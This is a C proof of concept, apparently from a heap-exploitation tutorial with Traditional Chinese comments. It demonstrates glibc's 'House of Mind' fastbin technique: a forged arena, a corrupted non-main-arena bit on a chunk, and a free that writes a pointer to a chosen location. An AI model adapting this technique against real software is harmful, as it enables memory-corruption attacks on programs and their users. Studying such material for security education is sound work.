#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

    int HEAP_MAX_SIZE = 0x4000000;
    int MAX_SIZE = (128 * 1024) - 0x100; // 不要超過 mmap threshold

    // fake_arena 為我們所構造的假 arena
    uint8_t *fake_arena = malloc(0x1000);
    uint8_t *target_loc = fake_arena + 0x30;
    uint8_t *target_chunk = (uint8_t *)fake_arena - 0x10; // chunk 的開頭

    fake_arena[0x888] = 0xFF; // update fake_arena 的 'system_mem' 欄位
    fake_arena[0x889] = 0xFF;
    fake_arena[0x88a] = 0xFF;
    // debug: p *(struct malloc_state *) fake_arena

    // 根據 macro:
    // #define heap_for_ptr(ptr) ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1)))
    // 來計算新 heap_info 的記憶體位址
    uint64_t new_arena_value = (((uint64_t)target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
    uint64_t *fake_heap_info = (uint64_t *)new_arena_value;

    // 持續 malloc 直到分配到 fake_heap_info 位址
    uint64_t *user_mem = malloc(MAX_SIZE);
    while ((long long) user_mem < new_arena_value)
        user_mem = malloc(MAX_SIZE);

    // Use this later to trigger craziness
    uint64_t *fastbin_chunk = malloc(0x50); 
    uint64_t *chunk_ptr = fastbin_chunk - 2; // chunk 的開頭

    // 填滿 tcache
    uint64_t *tcache_chunks[7];
    for (int i = 0; i < 7; i++)
        tcache_chunks[i] = malloc(0x50);
    for (int i = 0; i < 7; i++)
        free(tcache_chunks[i]);

    fake_heap_info[0] = (uint64_t)fake_arena; // set ar_ptr (arena pointer)
    // ! vuln
    chunk_ptr[1] = 0x60 | 0x4; // set the non-main arena bit

    // 此塊 fastbin chunk 會被我們一開始所建立的 fake_arena 所維護
    // 因此 fastbinsY 會有對應的 pointer
    free(fastbin_chunk);
    // debug: p *(struct malloc_state *) fake_arena

    assert(*((unsigned long *)(target_loc)) != 0);
}